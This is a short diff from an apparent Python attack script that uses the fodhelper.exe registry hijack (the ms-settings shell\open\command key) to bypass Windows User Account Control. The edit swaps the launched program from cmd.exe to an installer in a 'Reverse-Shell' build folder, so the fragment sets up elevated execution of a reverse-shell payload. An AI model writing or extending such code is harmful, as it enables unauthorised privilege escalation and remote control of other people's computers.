@@ -3,7 +3,7 @@ import sys
 import ctypes
 import winreg
 
-CMD = r"C:\Windows\System32\cmd.exe"
+CMD = r"C:\Users\User\Desktop\Reverse-Shell\dist\installer.exe"
 FOD_HELPER = r'C:\Windows\System32\fodhelper.exe'
 PYTHON_CMD = "python"
 REG_PATH = 'Software\Classes\ms-settings\shell\open\command'
